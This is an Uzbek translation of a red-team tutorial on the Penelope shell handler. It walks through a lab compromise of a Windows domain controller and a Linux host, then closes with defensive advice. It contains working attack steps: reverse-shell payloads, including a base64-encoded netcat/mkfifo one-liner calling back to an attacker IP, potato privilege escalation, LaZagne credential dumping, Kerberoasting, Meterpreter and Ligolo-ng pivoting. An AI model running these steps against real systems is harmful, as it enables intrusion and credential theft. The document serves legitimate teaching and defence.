---
title: "Penelope: Red Team uchun Netcat'ning zamonaviy muqobili"
description: "Penelope — avtomatlashtirilgan shell-handler va post-exploitation freymvorki. Windows domen kontrollerida reverse shell'dan SYSTEM'gacha huquq oshirish, credential dumping, Active Directory, Kerberoasting, Meterpreter, Ligolo-ng bilan pivoting va Linux enumeratsiyasi — to'liq engagement ko'rinishida, himoya choralari bilan."
date: 2026-11-13
tags: [red-team, post-exploitation, penelope, reverse-shell, active-directory, pivoting, ligolo-ng, uzbek]
lang: uz
draft: false
---

Bu qo'llanma **Penelope** — avtomatlashtirilgan, kross-platformali shell-handler va post-exploitation freymvorki haqida. Ko'pchilik operatorlar odatdagidek ishlatadigan oddiy "netcat" listener o'rniga Penelope butun engagement'ni bitta konsoldan boshqarishga imkon beradi: Windows domen kontrollerida dastlabki reverse shell'ni qabul qilishdan tortib, SYSTEM'gacha huquq oshirish, credential dumping, Active Directory razvedkasi, Kerberoasting, Meterpreter'ga uzatish, Ligolo-ng bilan yashirin tarmoqqa pivot qilish va Linux hostni enumeratsiya qilishgacha.

> ⚖️ **FAQAT RUXSAT BILAN**
> Bu yerdagi usullar faqat yozma ruxsat berilgan pentest, red team, bug bounty (dastur qoidalari doirasida), CTF yoki o'zingizga tegishli laboratoriyada qo'llanadi. Ruxsatsiz kirish, huquq oshirish va credential o'g'irlash ko'plab davlatlarda jinoiy javobgarlikka sabab bo'ladi (masalan, O'zbekiston Respublikasi JK 278-1 – 278-7-moddalari, Kanada Criminal Code 342.1-bo'limi, AQSH CFAA — 18 U.S.C. § 1030). Quyidagi butun bosqichlar yakkalangan laboratoriyada, faqat ruxsat etilgan sinov va ta'lim maqsadida bajarilgan.

> 📝 **MANBA**
> Bu matn — Ignite Technologies / Hacking Articles tomonidan ingliz tilida chop etilgan *"Penelope – A Modern Alternative to Netcat for Red Teamers"* qo'llanmasining o'zbekcha tarjimasi va qayta ishlangan konspekti. Barcha asl huquqlar mualliflarga tegishli; bu yerda o'quv maqsadida, manba ko'rsatilgan holda keltirilmoqda.

## Umumiy ko'rinish

Bu maqola to'liq bir engagement'ni ko'rsatadi va u butunlay Penelope atrofida qurilgan. Biz Windows Server 2019 domen kontrollerida dastlabki reverse shell'ni qabul qilamiz; Penelope modullari yordamida huquqni oshiramiz, credential'larni dump qilamiz, Active Directory ma'lumotlarini yig'amiz va bitta service account'ni Kerberoast qilamiz; so'ng sessiyani Meterpreter'ga uzatib, ortimizdan qolgan artefaktlarni tozalaymiz.

Shundan so'ng Ligolo-ng yordamida domen kontrolleri orqali yashirin subnetga pivot qilamiz, Linux hostni egallab olamiz va to'liq Linux enumeratsiya to'plamini ishga tushiramiz. Nihoyat, Penelope'ning operatsion "umurtqa pog'onasi"ni ko'rib chiqamiz — maxsus listener'lar, moslashtirilgan payload yaratish, bind-shell ulanishlari, ko'p sessiyani boshqarish, port forwarding, fayl uzatish va ichki o'rnatilgan HTTP fayl-server. Bir butun holda bu bosqichlar bitta konsol Windows va Linux bo'ylab to'liq post-exploitation hayotiy siklini qanday boshqarishini ko'rsatadi.

## Kirish

Penelope — avtomatlashtirilgan, kross-platformali shell-handler bo'lib, ko'pchilik operatorlar sukut bo'yicha ishlatadigan oddiy "netcat" listener o'rnini bosish uchun yaratilgan. U shunchaki reverse shell'ni qabul qilibgina qolmaydi: bir vaqtning o'zida bir nechta sessiyani boshqaradi, har bir interaksiyani diskka yozib boradi (log), xom (raw) shell'larni to'liq interaktiv PTY'ga yangilaydi va boy post-exploitation modullari kutubxonasini taqdim etadi. Bitta buyruq bilan operator huquq oshirish enumeratsiya vositalari, credential-dumping utilitalari, Active Directory tradecraft'i, pivoting agentlari va persistence mexanizmlarini to'g'ridan-to'g'ri nishonga yetkazishi mumkin.

Freymvork operatorga shell'lar qanday ulanishi ustidan ham aniq nazorat beradi: talab bo'yicha listener qo'shadi, mos payload'lar yaratadi, bind shell'larga ulanadi, mavjud sessiya orqali portlarni forward qiladi va fayllarni HTTP orqali uzatadi. Penelope engagement'ning takrorlanuvchi "quvur ishlarini" — eng yangi vositalarni yuklab olish, ularni qurbonga yuklash, ishga tushirish va natijani yozib olish — avtomatlashtirgani uchun operator logistika emas, balki tradecraft'ga e'tibor qaratishi mumkin. Quyidagi qadam-baqadam ko'rib chiqish aynan shu ish oqimini dastlabki kirishdan tortib pivoting va operatsion nazoratgacha kuzatib boradi.

## Laboratoriya muhiti

Engagement yakkalangan VMware laboratoriyasida bajariladi; unda Kali hujumchi mashinasi va **IGNITE (ignite.local)** domenidagi bir nechta nishon bor. Domen kontrolleri orqali pivot qilish Kali'dan to'g'ridan-to'g'ri yetib bo'lmaydigan qo'shimcha ichki subnetni ochib beradi.

## Penelope'ni o'rnatish

Biz Penelope'ni to'g'ridan-to'g'ri Kali repozitoriylaridan o'rnatishdan boshlaymiz. Paket yengil — taxminan 50 KB — va APT resolveri `kali-rolling` main tarmog'idan bitta yangi paket o'rnatilishini tasdiqlaydi. O'rnatilgach, `penelope` ikkilik fayli butun tizim bo'ylab mavjud bo'ladi.

```bash
apt install penelope
```

## Listener'ni ishga tushirish

Keyin Penelope'ni ishga tushiramiz va listener'ni TCP 5000-portga bog'laymiz. Penelope darhol `0.0.0.0:5000` da tinglayotganini xabar qiladi va operator callback uchun ishlatishi mumkin bo'lgan har bir interfeys manzilini — bu yerda `192.168.1.17` ni ham — chop etadi. Interaktiv prompt asosiy menyu, payload yaratish, ekranni tozalash va chiqish uchun yorliqlarni ham ko'rsatadi.

```bash
penelope -p 5000
```

## Reverse shell payload yaratish

Listener ishga tushgach, nishon bajaradigan payload'ni tayyorlaymiz. **Reverse Shell Generator** yordamida hujumchi IP'sini `192.168.1.17`, portni `5000` qilib belgilaymiz va Windows uchun "PowerShell #2" shablonini tanlaymiz. Generator mustaqil (self-contained) PowerShell bir qatorli payload'ini ishlab chiqadi: u listener'imizga TCP mijoz ochadi va ulanish orqali interaktiv shell'ni uzatadi.

Quyidagi PowerShell payload nishonga yetkaziladi (bu yerda o'qish qulayligi uchun bir necha qatorga bo'lingan; amalda esa bitta qator sifatida ishlaydi):

```powershell
powershell -nop -c "command"
```

## Reverse shell'ni qabul qilish

Payload qurbonda ishga tushishi bilan Penelope ulanishni bir zumda ushlaydi. U hostni "barmoq izi" (fingerprint) bo'yicha aniqlaydi va `192.168.1.11` manzilidagi "DC" dan yangi reverse shell kelganini xabar qiladi hamda uni **Microsoft Windows Server 2019 Standard Evaluation x64** mashinasi sifatida belgilaydi. Penelope readline qo'llab-quvvatlashini qo'shadi, bizni **Session 1** ga ulaydi va keyinroq ko'rib chiqish uchun diskka sessiya logini yozadi. Tezkor `whoami` biz `ignite\administrator` — DC'dagi o'rnatilgan domen administratori sifatida ishlayotganimizni tasdiqlaydi.

```bash
whoami
```

## Sessiyani ajratish (detach)

Penelope interaktiv shell'dan uni o'ldirmasdan chekinishga imkon beradi. **Ctrl-D** bosilsa, joriy sessiya ajratiladi (detach) va bizni Penelope menyusiga qaytaradi; prompt endi faol `Session [1]` ni ko'rsatadi. Nishondagi shell tirik qoladi — biz unga qayta ulanishimiz yoki menyudagi modullar bilan boshqarishimiz mumkin.

```text
[ Sessiyani ajratish uchun Ctrl-D bosing ]
```

## Mavjud modullar ro'yxati

Menyudan `modules` buyrug'i Penelope'ning post-exploitation arsenalini ochib beradi va u maqsadi bo'yicha ozoda guruhlangan: **Privilege Escalation** (winPEAS, LinPEAS, PowerUp, PrivescCheck, potato ekspluatatsiyalari va boshqalar), **Credential Dumping** (Mimikatz, LaZagne, Snaffler, SharpWeb), **Active Directory** (PowerView, SharpHound, GhostPack), **Forensics**, **Pivoting** (Ligolo-ng, Chisel, ngrok), **Persistence** (PANIX) va Meterpreter ishga tushirgichi hamda cleanup rutinasi kabi yordamchi vositalar. Har bir modul eng yangi relizni yuklab olish va uni nishonga joylashni avtomatlashtiradi.

```bash
modules
```

## Help menyusini ko'rib chiqish

`help` buyrug'i Penelope'ning to'liq buyruqlar to'plamini hujjatlashtiradi. Sessiya operatsiyalariga `run`, `upload`, `download`, `open`, `spawn`, `upgrade`, `exec`, `script` va `portfwd` kiradi; sessiyani boshqarish `sessions`, `use`, `interact` va `kill` ni qamrab oladi; shell boshqaruvi esa `listeners`, `payloads` va `connect` ni ochib beradi. Bu yagona ma'lumotnoma freymvorkni engagement o'rtasida ham tushunarli qiladi.

```bash
help
```

## Huquq oshirish enumeratsiyasi (Windows)

Post-exploitation'ni huquq oshirish vositalarini joylashdan boshlaymiz. `run upload_privesc_scripts` moduli eng yangi `winPEASany.exe`, `winPEAS.bat`, `PowerUp.ps1` va `PrivescCheck.ps1` ni yuklab oladi va har birini nishonning administrator profiliga yuklaydi, har bir fayl uchun "Upload OK" ni tasdiqlaydi.

```bash
run upload_privesc_scripts
```

Vositalar joyida bo'lgach, hostni enumeratsiya qilish uchun winPEAS'ni ishga tushiramiz. winPEAS noto'g'ri sozlamalar, imtiyozli obyektlar va maxfiy ma'lumotlarni qidiradi hamda topilmalarini rang bilan belgilaydi — huquq oshirishning potensial yo'llari uchun qizil, mustahkamlangan sozlamalar uchun yashil, faol va o'chirilgan foydalanuvchilar uchun moviy — eng tez elevatsiya yo'lini ajratib ko'rsatish uchun.

```bash
exec C:\Users\Administrator\winPEASany.exe
```

## Potato ekspluatatsiyalarini joylash

`SeImpersonatePrivilege` imtiyoziga ega service account'lar "potato" ekspluatatsiyalari oilasi uchun asosiy nishon hisoblanadi. `run upload_potato` moduli nishonga `GodPotato-NET4.exe`, `SigmaPotato.exe` va `PrintSpoofer64.exe` ni yuklaydi; har biri token impersonation'ni suiiste'mol qilib `NT AUTHORITY\SYSTEM` gacha huquq oshiradi.

```bash
run upload_potato
```

Session 1'ga qayta ulanib, buyruqni SYSTEM sifatida bajarish uchun GodPotato'ni ishga tushiramiz. RPCSS DCOM trigger orqali qo'lga kiritilgan SYSTEM tokenini impersonatsiya qilib, GodPotato administrator account parolini biz tanlagan qiymatga qayta o'rnatadi. Natija impersonatsiya `NT AUTHORITY\SYSTEM` sifatida muvaffaqiyatli bo'lganini va buyruq muvaffaqiyatli bajarilganini tasdiqlaydi.

```bash
sessions 1
./GodPotato-NET4.exe -cmd "net user administrator Ignite@987"
```

## Credential Dumping

Keyin credential'larni yig'amiz. `run upload_credump_scripts` moduli nishonga Mimikatz, LaZagne, Snaffler va SharpWeb'ni joylaydi. Bu vositalar birgalikda keshlangan sirlarni, brauzer va ilova parollarini hamda fayl bo'limlari (file shares) bo'ylab tarqalgan credential'larni ajratib oladi.

```bash
run upload_credump_scripts
```

LaZagne'ni ishga tushirish qo'llab-quvvatlanadigan har bir dasturiy modul bo'ylab sirlarni dump qiladi. SYSTEM sifatida ishlar ekan, u tizim master kalitlarini deshifrlaydi va LSA sirlarini — jumladan machine account hash'ini, autologon uchun ishlatiladigan `DefaultPassword` ni, `DPAPI_SYSTEM` kalitini va `NL$KM` keshlangan-credential kalitini — ochib beradi; bular lateral movement uchun boy material bo'ladi.

```bash
exec C:\Users\Administrator\LaZagne.exe
```

## Active Directory vositalari

Domenni xaritalash va unga hujum qilish uchun Active Directory tradecraft'ini joylaymiz. `run upload_ad_scripts` moduli domen razvedkasi uchun `PowerView.ps1` ni, BloodHound uchun ma'lumot yig'ishda `SharpHound` ni va kompilyatsiya qilingan C# hujum vositalarining to'liq GhostPack to'plamini yuklaydi.

```bash
run upload_ad_scripts
```

GhostPack katalogini ro'yxatga olish to'liq to'plamni ochib beradi — Rubeus, Certify, Seatbelt, SharpRoast va boshqalar, bir nechta .NET versiyasi uchun kompilyatsiya qilingan. So'ng domenni Kerberoast qilish uchun Rubeus'ni ishga tushiramiz; u yagona kerberoast qilinadigan account — `hackingarticles/ignite.local` service principal name'iga ega **"raj"** ni aniqlaydi va uning buzib bo'ladigan ticket hash'ini oflayn kraking uchun `hash.txt` ga yozadi.

```bash
exec dir C:\Users\Administrator\ghostpack
exec C:\Users\Administrator\ghostpack\Rubeus.exe kerberoast /outfile:hash.txt
```

## Meterpreter sessiyasini ochish

Penelope Metasploit Framework bilan toza integratsiyalashadi. `run meterpreter` moduli msfvenom bilan x64 Windows Meterpreter reverse-TCP payload'ini yaratadi, uni nishonning temp katalogiga yuklaydi va — `LHOST` imiz `192.168.1.17`, `LPORT` imiz `5555` bilan oldindan sozlangan — aniq msfconsole handler buyrug'ini chop etadi, so'ng payload'ni qurbonda ishga tushiradi.

```bash
run meterpreter
```

msfconsole'da handler'ni ishga tushirib, yuklangan ikkilik faylni trigger qilsak, Metasploit `192.168.1.11` dan Meterpreter sessiyasi ochilganini xabar qiladi. `sysinfo` domen kontrolleri ustidan to'liq nazoratni tasdiqlaydi: kompyuter DC, Windows Server 2019 (Build 17763), x64 arxitektura, IGNITE domeniga qo'shilgan.

```bash
msfconsole -x "use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.17
set LPORT 5555
run
sysinfo
```

## Artefaktlarni tozalash

Yaxshi operatsion xavfsizlik (OPSEC) joylagan vositalarimizni olib tashlashni talab qiladi. `run cleanup` moduli Penelope engagement davomida yuklagan har bir faylni — Mimikatz, LaZagne, Snaffler, SharpWeb, PowerView, SharpHound, GhostPack va Kerberoast natijasini — o'chiradi, nishonni oldingi holatiga qaytaradi va forensic izni kamaytiradi.

```bash
run cleanup
```

## Ligolo-ng bilan pivoting

Domen kontrolleri to'liq nazoratimizda bo'lgach, chuqurroq pivot qilishga tayyorlanamiz. Hujumchida biz Ligolo-ng proksisini self-signed sertifikat bilan ishga tushiramiz; u konfiguratsiyasini yuklaydi va kiruvchi agentlar uchun `0.0.0.0:11601` da tinglaydi.

```bash
ligolo-proxy --selfcert
```

Penelope'ga qaytib, `run ligolo` moduli mos Ligolo-ng Windows agentini yuklab olib nishonga yuklaydi. So'ng agentni ishga tushirib, unga sertifikat tekshiruvini e'tiborsiz qoldirgan holda `192.168.1.17:11601` dagi proksimizga qayta ulanishni buyuramiz. Tunnel o'rnatilgach, operator trafikni domen kontrolleri orqali yo'naltirib, aks holda yetib bo'lmaydigan ichki segmentlarga chiqishi mumkin.

```bash
run ligolo
exec C:\Users\Administrator\agent.exe -connect 192.168.1.17:11601 -ignore-cert
```

## Pivot marshrutini o'rnatish

Agent "Agent joined" deb xabar bergach, domen kontrolleri sessiyasini tanlab, uning interfeyslarini ko'rib chiqamiz. `ifconfig` chiqishi DC "dual homed" ekanini — asosiy `192.168.1.11` manzili bilan bir qatorda, Interface 1'da ikkinchi manzil `192.168.147.130/24` borligini — ochib beradi; bu Kali to'g'ridan-to'g'ri yetib bo'lmaydigan ichki subnetni ko'rsatadi. So'ng `autoroute` ni ishga tushiramiz, o'sha `192.168.147.130/24` tarmog'ini tanlaymiz, Ligolo yangi virtual interfeys yaratsin va tunnel ishga tushsin. Shu nuqtadan boshlab `192.168.147.0/24` oralig'iga yo'naltirilgan trafik egallab olingan DC orqali shaffof tarzda o'tadi.

```bash
session
ifconfig
autoroute
```

## Yashirin hostni skanerlash va unga kirish

Marshrut tirik bo'lgach, tunnel orqali yangi yetib bo'ladigan hostni skanerlaymiz. `192.168.147.131` ning Nmap xizmat skani FTP (vsftpd 3.0.5), SSH (OpenSSH 8.9p1), Apache 2.4.52, rpcbind, Samba va NFS ishlayotgan Linux serverni aniqlaydi. To'g'ri credential'lar bilan `pentest` foydalanuvchisi sifatida SSH sessiyasini ochamiz va bir necha daqiqa oldin Kali nuqtai nazaridan umuman mavjud bo'lmagan `ignite` nomli Ubuntu 22.04.5 LTS hostga tushamiz.

```bash
nmap -sV 192.168.147.131
ssh pentest@192.168.147.131
```

## Linux shell'ni qabul qilish va yangilash

Keyin Linux hostdan reverse shell'ni Penelope'ga qaytib yo'naltiramiz. 5000-portdagi listener ulanishni ushlaydi, uni `pentest` sifatida ishlayotgan `ignite` (192.168.1.9, Linux-x86_64) deb fingerprint qiladi va — eng muhimi — xom shell'ni python3 yordamida avtomatik ravishda to'liq interaktiv PTY'ga yangilaydi. Tezkor `lsb_release -a` Ubuntu 22.04.5 LTS (jammy) ni tasdiqlaydi. So'ng sessiyani ajratamiz (F12 — sessiyani detach qilish) va uni modul orqali enumeratsiya uchun tirik qoldiramiz.

```bash
penelope -p 5000
lsb_release -a
```

## Linux huquq oshirish enumeratsiyasi

Linux enumeratsiyasini PEASS-ng bilan boshlaymiz. `run peass_ng` moduli eng yangi `linpeas.sh` ni yuklab oladi, uni nishonda fonda ishga tushiradi va jonli chiqishni alohida terminalga uzatadi. LinPEAS huquq oshirish yo'llarini tizimli qidiradi va topilmalarini rang bilan belgilaydi, RED/YELLOW deb belgilangan har qanday narsani 95% ehtimolli elevatsiya yo'li sifatida bayroqlaydi.

```bash
run peass_ng
```

Natijalarni tasdiqlash uchun Linux Smart Enumeration'ni ishga tushiramiz. `run lse` moduli `lse.sh` ni oladi va ishga tushiradi; u foydalanuvchi konteksti, host tafsilotlari va ko'rsatuvchanligi oshib boruvchi bosqichli xavfsizlik tekshiruvlari to'plamining ozoda hisobotini ishlab chiqadi.

```bash
run lse
```

Nihoyat, e'tiborni yadro va paket zaifliklariga qaratamiz. `run linuxexploitsuggester` moduli `linux-exploit-suggester` ni yuklab oladi va yadroni ma'lum CVE'larga solishtiradi, nomzodlar sifatida masalan CVE-2021-3156 (Sudo "Baron Samedit" heap overflow'i) va CVE-2021-22555 (Netfilter heap out-of-bounds write'i) ni ta'sir darajalari va ekspluatatsiya havolalari bilan ko'rsatadi.

```bash
run linuxexploitsuggester
```

## Forensic artefaktlarni yig'ish

Penelope himoya va forensic ish oqimlarini ham qo'llab-quvvatlaydi. `run uac` moduli Unix-like Artefacts Collector'ni `/dev/shm` ga yuklaydi, uni ochadi va deyarli 200 ta artefakt ta'rifining tuzilgan to'plamini — jarayonlar ro'yxati, ochiq fayllar va live-response ma'lumotlari — ishga tushiradi, natijalarni keyinroq tahlil qilish uchun nishonda vaqt belgisi qo'yilgan arxivga yozadi.

```bash
run uac
```

## Bir nechta sessiyani boshqarish

Bir nechta tayanch nuqta (foothold) qo'lda bo'lgach, Penelope'ning sessiya boshqaruvi o'z kuchini ko'rsatadi. `history` buyrug'i engagement davomida berilgan har bir asosiy menyu buyrug'ini qayta ko'rsatadi — bu baholashni hujjatlashtirishda yoki murakkab hujum yo'lini qayta tiklashda bebaho audit izi.

```bash
history
```

### sessions

`sessions` buyrug'i har bir faol shell'ni bir qarashda ro'yxatga oladi. Bu yerda Penelope ikkitasini ushlab turibdi: Linux hostdagi **Session 1** (ignite, 192.168.1.9, pentest sifatida PTY shell) va Windows DC'dagi **Session 2** (192.168.1.11, ignite\administrator sifatida xom shell).

```bash
sessions
```

### interact

Kontekstni almashtirish uchun aniq bir shell'ga to'g'ridan-to'g'ri ulanamiz. `interact 2` buyrug'i bizni Windows DC sessiyasiga tushiradi va tanish PowerShell prompt'ini qaytaradi.

```bash
interact 2
```

### kill

Sessiyalarni toza tarzda yopish ham mumkin. `kill 2` buyrug'i DC shell'ni tugatadi — Penelope sessiya o'lganini xabar qiladi — va keyingi `sessions` faqat Linux host qolganini tasdiqlaydi.

```bash
kill 2
sessions
```

### use

`use 1` buyrug'i Linux sessiyasini darhol uning shell'iga ulanmasdan faol nishon sifatida tanlaydi; shunda keyingi menyu buyruqlari va modullari unga nisbatan qo'llanadi.

```bash
use 1
```

### spawn

Bitta shell yetarli bo'lmaganda, Penelope ko'proq shell ochishi mumkin. `spawn 1234` buyrug'i `192.168.1.17:1234` da yangi listener ochadi va o'sha Linux hostdan qo'shimcha reverse shell'ni trigger qiladi; u **Session 3** sifatida keladi. Endi `sessions` ikkala shell'ni — 5000-portdagi asl PTY va 1234-portdagi yangi xom shell'ni — ko'rsatadi; agar bitta ulanish uzilsa, bu zaxira (redundancy) beradi.

```bash
spawn 1234
sessions
```

## Local Port Forwarding

Ko'plab xizmatlar faqat localhost'ga bog'lanadi va tarmoqdan yashirin turadi. Nishonda `exec netstat -antp` ni ishga tushirish aynan shunday xizmatni — `127.0.0.1:8080` da tinglayotgan, faqat hostning o'zidan yetib bo'ladigan xizmatni — ochib beradi.

```bash
exec netstat -antp
```

Bu xizmat loopback'ga bog'langani uchun nishonning 8080-portiga tarmoq orqali kirishga urinish muvaffaqiyatsiz tugaydi — Firefox shunchaki "Unable to connect" deydi. Xizmat uzoqdagi hujumchi uchun amalda ko'rinmas.

```text
http://192.168.1.11:8080
```

Penelope buni o'rnatilgan port forwarding bilan hal qiladi. `portfwd` buyrug'i mavjud sessiya orqali bizning lokal `127.0.0.1:8080` ni nishonning `127.0.0.1:8080` ga tunnel qiladi va qurbonga qo'shimcha vosita kerak bo'lmagan holda loopback bo'shlig'ini bog'laydi.

```text
portfwd 127.0.0.1:8080 -> 127.0.0.1:8080
```

Forward o'rnatilgach, hujumchida `http://localhost:8080` ga o'tsak, yashirin veb-ilova toza yuklanadi va bizni "Welcome to Hacking Articles" bilan kutib oladi. Bir zum oldin yetib bo'lmaydigan xizmat endi to'liq ochiq.

```text
http://localhost:8080
```

## Nishondan va nishonga fayl uzatish

Penelope fayl uzatishni oson qiladi. `upload` buyrug'i lokal faylni nishonga yuboradi; bu yerda `raj.txt` ni yuklaymiz va uning yetib kelganini `exec ls -al` bilan tasdiqlaymiz — u faylni kutilgan egalik va vaqt belgisi bilan `/home/pentest` ostida ko'rsatadi.

```bash
upload raj.txt
exec ls -al /home/pentest/raj.txt
```

Fayllarni qaytarib olish ham xuddi shunday oddiy. Nishonning home katalogini `exec ls` bilan ro'yxatga olib, `ignite.txt` da `download` ni ishga tushiramiz; Penelope uni oladi va hujumchidagi har-sessiyaga tegishli downloads papkasi ichida ozoda saqlaydi.

```bash
exec ls /home/pentest/
download /home/pentest/ignite.txt
```

Nihoyat, eksfiltratsiya qilingan faylni Kali'da tekshiramiz. Sessiyaning downloads katalogidan yuklab olingan `ignite.txt` ni o'qish uning mazmunini — "Visit Hacking Articles" — qaytaradi va toza "borib-kelish" (round-trip) uzatuvini tasdiqlaydi.

```bash
cat /root/.penelope/sessions/ignite~192.168.1.11-Linux-x86_64/downloads/home/pentest/ignite.txt
```

## Maxsus listener qo'shish

Shell'larni ushlashdan tashqari, Penelope operatorga ulanishlar qanday va qayerda kelishi ustidan aniq nazorat beradi. Aniq interfeys va portda listener yaratishdan boshlaymiz. `listeners add` buyrug'i yangi TCP listener'ni `192.168.1.17` ning 8888-portiga bog'laydi va Penelope darhol tinglayotganini tasdiqlaydi. So'ng `listeners` har bir faol listener'ni ro'yxatga oladi va yangi yozuvni callback qabul qilishga tayyor ID 3 sifatida ko'rsatadi.

```bash
listeners add -i 192.168.1.17 -p 8888
listeners
```

## Listener uchun payload yaratish

Penelope har qanday faol listener uchun mos payload'lar tayyorlashi mumkin. `payloads eth0` buyrug'i `192.168.1.17:8888` dagi eth0 listener'iga bog'langan bir qatorli payload'lar to'plamini yaratadi va bir necha xilni taklif etadi — Bash TCP, nomlangan quvur (named pipe) bilan Netcat, PowerShell va Metasploit handler konfiguratsiyasi. Har bir payload to'g'ri host va port bilan oldindan to'ldirilgan, shuning uchun ishlatishdan oldin tahrirlash shart emas.

```bash
payloads eth0
```

## Payload'ni nishonda ishga tushirish

Keyin yaratilgan payload'lardan birini Linux nishonda ishga tushiramiz. Nomlangan quvur bilan Netcat bir qatorli payload'i base64 bilan kodlangan; uni dekodlab shell'ga uzatish FIFO yaratadi, shell'ning kirish va chiqishini unga ulaydi va 8888 listener'imizga qayta ulanadi. Buyruq jim qaytadi, bu esa reverse shell ishga tushganini bildiradi.

```bash
printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxOTIuMTY4LjEuMTcgODg4OCA+L3RtcC9fKSA+L2Rldi9udWxsIDI+JjEgJg==|base64 -d|sh
```

## Yangi reverse shell'ni qabul qilish

Penelope'ga qaytib, payload o'z samarasini beradi. Konsol `pentest` sifatida ishlayotgan `ignite` (192.168.1.11) dan yangi reverse shell kelganini e'lon qiladi va unga Session ID 3 ni biriktiradi. `sessions` ro'yxati shell maxsus `192.168.1.17:8888` listener'iga kelganini tasdiqlaydi — 5000-portdagi oldingi sessiyadan aniq ajralib turadi — bu esa alohida listener'lar bir vaqtdagi operatsiyalarni qanday tartibli saqlashini ko'rsatadi.

```bash
sessions
```

## Bind shell'ga ulanish

Penelope faqat reverse shell'lar bilan cheklanmaydi. Nishon allaqachon bind shell bilan tinglayotgan bo'lsa, `connect` buyrug'i unga to'g'ridan-to'g'ri yetib boradi. Bu yerda `192.168.1.12` dagi Windows DC'ning 4321-portidagi bind shell'ga ulanamiz; Penelope ulanishni o'rnatadi, hostni Windows Server 2019 sifatida fingerprint qiladi, readline qo'llab-quvvatlashini qo'shadi va bizni to'g'ridan-to'g'ri **Session 4** sifatida interaktiv sessiyaga tushiradi.

```bash
connect 192.168.1.12 4321
```

## SSH orqali reverse shell ochish

Penelope listener'ni ishga tushirish va shell'ni trigger qilishni bitta buyruqda ham bajarishi mumkin. Ishga tushirish qatoriga SSH direktivasini qo'shib, 5555-portda listener ishga tushiramiz va Penelope `192.168.1.11` ga qarshi SSH orqali reverse-shell buyrug'ini bitta qadamda bajaradi. Penelope SSH buyrug'i bajarilganini xabar qiladi, natijaviy shell'ni ushlaydi va — avvalgidek — uni python3 orqali avtomatik to'liq interaktiv PTY'ga yangilaydi. Tezkor `whoami` biz `pentest` foydalanuvchisi ekanimizni tasdiqlaydi.

```bash
penelope -p 5555 ssh pentest@192.168.1.11
whoami
```

## HTTP orqali fayl ulashish

Vositalarni joylash va o'ljani eksfiltratsiya qilish ko'pincha tezkor veb-server talab qiladi. Penelope bittasini o'z ichiga oladi: `-s` bayrog'i lokal katalogni HTTP orqali ulashadi. Uni "share" papkasida ishga tushirish `/root/share` ni 8000-portda nashr qiladi va har bir mavjud interfeys uchun, jumladan `192.168.1.17` uchun, to'liq URL'ni qulay tarzda chop etadi — shunda nishon fayllarni darhol olishi mumkin.

```bash
penelope -s share
```

Nashr qilingan URL'ga o'tish server tirik ekanini tasdiqlaydi. `http://192.168.1.17:8000/share/` ga o'tish ulashilgan papkaning katalog ro'yxatini ko'rsatadi va yuklab olish uchun `data.txt` hamda `secret.txt` ni ochib beradi — hujumchi va nishon o'rtasida fayllarni ko'chirishning tezkor, bog'liqliksiz (dependency-free) usuli.

```text
http://192.168.1.17:8000/share/
```

## Himoya strategiyalari

Himoyachilar bu engagement'ning har bir bosqichini qatlamli nazorat to'plami bilan buzishi mumkin:

- **Tarmoqlarni segmentlang** va domen kontrollerlari kabi maxfiy serverlarni "dual-homing" qilishdan saqlaning, shunda bitta kompromis yakkalangan subnetlarni bog'lay olmaydi yoki pivoting'ga imkon bermaydi.
- **Qattiq egress filtrlash** va ilovani biluvchi (application-aware) firewall'larni joriy eting, shunda ichki hostlar ixtiyoriy portlarda hujumchi nazoratidagi listener'larga chiquvchi ulanish ocha olmaydi; Ligolo-ng, Chisel yoki ngrok kabi vositalar yaratgan kutilmagan tunnellar yoki virtual interfeyslarni kuzating.
- **PowerShell'ni cheklang**: Constrained Language Mode, script-block va modul logging hamda AMSI bilan; kodlangan yoki download-cradle bir qatorli buyruqlarga alert bering.
- **`SeImpersonatePrivilege` ni olib tashlang** uni talab qilmaydigan account'lardan — bu token-impersonation potato ekspluatatsiyalari oilasini zararsizlantiradi.
- **Credential'larni himoyalang**: Credential Guard va LSA himoyasini (RunAsPPL) yoqing, WDigest'ni o'chiring va autologon `DefaultPassword` qiymatlarini tozalang.
- **Service account'larni Kerberoasting'dan mustahkamlang**: uzun, tasodifiy parolli Group Managed Service Account'lardan foydalaning va AES shifrlash turlarini majburiy qiling.
- **O'z vaqtida yadro va paket yangilanishlarini qo'llang** — CVE-2021-3156 va CVE-2021-22555 kabi lokal huquq oshirish nuqsonlarini yoping; LinPEAS va LSE muntazam bayroqlaydigan SUID ikkilik fayllar va keraksiz Sudo qoidalarini cheklang.
- **SSH'ni cheklang va loglang**: kalitga asoslangan autentifikatsiya, MFA, manba-IP allow-listing va buyruq auditi bilan — uzoqdan in'ektsiya qilingan reverse-shell buyruqlarini ushlash uchun.
- **Bind shell'lar va vaqtinchalik fayl-serverlarni aniqlang**: har bir host ochishi kerak bo'lgan qonuniy xizmatlarni baseline qiling va kutilmagan tinglovchi portlar yoki HTTP uzatishlariga alert bering.
- **Shell tradecraft'ini kuzating** — base64-dekodlangan bir qatorli buyruqlar, nomlangan quvur (mkfifo) reverse shell'lari va soket ochish uchun nc, bash yoki PowerShell'ning kutilmagan ishlatilishi — hamda joylash yoki eksfiltratsiyadan dalolat beruvchi ommaviy fayl o'qish/yozishlarni nazorat qiling.
- **EDR va tarmoq aniqlashni joylang**: listener yaratish, payload ishga tushirish, credential'ga kirish va yangi sessiyalarni yakka hodisalar emas, balki yagona bostirib kirish (intrusion) sifatida o'zaro bog'lang.

## Xulosa

